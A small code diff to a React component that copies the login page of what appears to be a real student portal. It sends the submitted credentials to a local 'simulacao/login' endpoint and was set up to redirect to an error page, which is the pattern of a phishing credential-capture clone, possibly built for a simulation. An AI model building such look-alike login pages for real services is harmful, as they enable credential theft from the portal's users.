@@ -3,7 +3,6 @@ import "./Styles/animacao.css"
 import "./Styles/customProviders.css"
 import "./Styles/style.css"
 import "./Styles/toaster.min.css"
-import { useNavigate } from 'react-router-dom';
 
 const BASE = "https://portalaluno.afya.com.br/web/app/edu/PortalEducacional";
 const LOGIN = `${BASE}/login`;
@@ -66,8 +65,6 @@ export default function PortalAluno() {
   const [newPass, setNewPass] = useState("");
   const [newPass2, setNewPass2] = useState("");
 
-   const navigate = useNavigate();
-
   // O HTML fornecido dependia do controller AngularJS para preencher aliases e OAuth.
   const aliases: string[] = [];
   const oauthProviders: Array<{ id: string; name: string }> = [];
@@ -114,8 +111,6 @@ export default function PortalAluno() {
 ) {
   event.preventDefault();
 
-  console.log("ENVIANDO:", user);
-
   try {
     const response = await fetch(
       "http://localhost:3000/simulacao/login",
@@ -139,9 +134,8 @@ export default function PortalAluno() {
 
     console.log(resultado);
 
-    navigate('/erro');
-
-    
+    // Aqui você coloca a ação que já utiliza
+    // para abrir sua tela de erro.
     
   } catch (error) {
     console.error(
